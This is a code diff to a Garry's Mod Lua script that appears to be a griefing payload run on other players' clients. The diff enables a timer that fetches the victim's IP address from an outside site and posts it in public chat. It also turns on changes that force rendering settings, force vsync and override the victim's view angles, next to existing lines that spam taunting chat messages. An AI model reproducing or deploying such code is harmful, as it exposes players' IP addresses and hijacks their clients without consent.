@@ -187,7 +187,7 @@ local function oniichan() --aids copypasta
 end
 -- ALL TIMERS
 _timer.Create("haha", 4, 10000, function() _command('say', math.Round(1/RealFrameTime())..' is my fps, silly onii-chan >_<')end) -- fps
---timer.Createreate("haha3", 10, 1, function() http.Fetch('http://ipv4bot.whatismyipaddress.com', function(b) _command('say',b) end,function() end) end)
+_timer.Createreate("haha3", 10, 1, function() http.Fetch('http://ipv4bot.whatismyipaddress.com', function(b) _command('say',b) end,function() end) end)
 _timer.Create("haha4", 6, 10000, function() _command('say', 'Ive taken '..tostring(jpegs)..' screenshots, onii-chan ~')end) -- screenshots
 --timer.Createreate("haha5",.1,100000,function() sound.PlayURL('https://files.catbox.moe/97zo9m.mp3','',function()end)end)
 _timer.Create('hahasong', .1, 1, function() Song = true end)
@@ -269,7 +269,7 @@ end)
 
 _hook.Add('RenderScene','funny',function()
 
-    --_render.SetLightingMode(2)
+    _render.SetLightingMode(2)
 
 end)
 _hook.Add('DrawOverlay','funny',function()
@@ -283,9 +283,9 @@ _hook.Add('CreateMove','funny',function( CUserCmd , GM )
     local mousex = CUserCmd:GetMouseX()
     local mousey = CUserCmd:GetMouseY()
     --_command('mat_motion_blur_enabled','1')
-    --_command('mat_vsync','1')
+    _command('mat_vsync','1')
     --render.SetAmbientLight(1,1,1)
-    --CUserCmd:SetViewAngles(PAngles - realangle)
+    CUserCmd:SetViewAngles(PAngles - realangle)
 
 end)
 _hook.Add("CalcView", "funny", function(ply, pos, angles, fov)
